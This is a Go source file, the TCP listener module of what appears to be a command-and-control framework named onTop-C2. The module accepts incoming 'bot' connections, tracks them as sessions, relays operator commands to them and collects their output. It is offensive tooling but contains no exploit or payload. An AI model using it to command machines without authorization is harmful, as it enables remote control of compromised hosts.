package modules

import (
	// Built-in imports
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"sync"

	// Internal imports
	"github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/types"
)

type ListenerSession struct {
	ID 			string
	BotIP		string
	Connection  net.Conn
	Commands 	chan string
	Outputs 	chan string

}

var Sessions = make(map[string]*ListenerSession)
func ipHandler(ip string, channel chan net.Conn) {
	misc.SysLog(fmt.Sprintf("Starting new handler for %v", ip), true)
	for conn := range channel {
		misc.SysLog(fmt.Sprintf("New connection from IP %v", ip), true)
		newSession := &ListenerSession{
			ID: fmt.Sprintf("bot-%d", rand.Intn(90000) + 10000),
			BotIP: ip,
			Connection: conn,
			Commands: make(chan string),
			Outputs: make(chan string),

		}
		
		Sessions[newSession.ID] = newSession
		misc.SysLog(fmt.Sprint("Session ID: ", newSession.ID, "\r\n"), true)

		go sessionHandler(newSession)

	}

}

func sessionHandler(sess *ListenerSession) {
	reader := bufio.NewReader(sess.Connection)
	writer := bufio.NewWriter(sess.Connection)
	
	go func() {
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				misc.PanicWarn(fmt.Sprintf("Some error ocurred in session handler: %v", err), true)
				break

			}
			sess.Outputs <- line

		}

	}()

	for commandByUser := range sess.Commands{
		_, err := writer.WriteString(commandByUser + "\n")
		if err != nil {
			break
		
		}
		
		writer.Flush()

	}

	

}

var ListenerOptions map[string]*types.Option = map[string]*types.Option{
	"PORT": {
		Name: "PORT",
		Description: "The port to listen",
		Required: true,
		Value: nil,

	},

}

var listener types.Module = types.Module{
	Name: "listener",
	Description: "Listen to TCP connections in the port, specified in options",
	Parallel: true,
	Options: ListenerOptions,
	Execute: StartListener,

}

func StartListener(opt map[string]*types.Option) {
	portOption, ok := opt["PORT"]
	if !ok {
		misc.PanicWarn("The 'port' option is unset", true)
		return

	}

	port, err := misc.AnyToInt(portOption.Value)
	if err != nil {
		misc.PanicWarn("The 'port' option value isn't a number\n", true)
		return

	}

	if !(port > 1024 && port < 65535) {
		misc.PanicWarn("The 'port' option value isn't valid, it must be between 1024 and 65535\n", true)
		return

	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error ocurred: %v", err.Error()), true)
		listener.Close()

	}

	defer listener.Close()
	misc.SysLog(fmt.Sprintf("Listening in the port %d...\r\n", port), true)

	ipClientChannel := make(map[string]chan net.Conn)
	var mu sync.Mutex

	for {
		conn, err := listener.Accept()
		if err != nil {
			misc.PanicWarn(fmt.Sprintln("Some error ocurred during connection:", err), true)
			continue

		}

		mu.Lock()
		connIP := misc.ScrapIP(conn.RemoteAddr().String())
		ch, alreadyExists := ipClientChannel[connIP]
		if !alreadyExists {
			ch = make(chan net.Conn, 100)
			ipClientChannel[connIP] = ch

			go ipHandler(connIP, ch)			

		}

		mu.Unlock()
		ch <- conn
		
	}

}

func init() {
	RegisterNewModule(&listener)

}
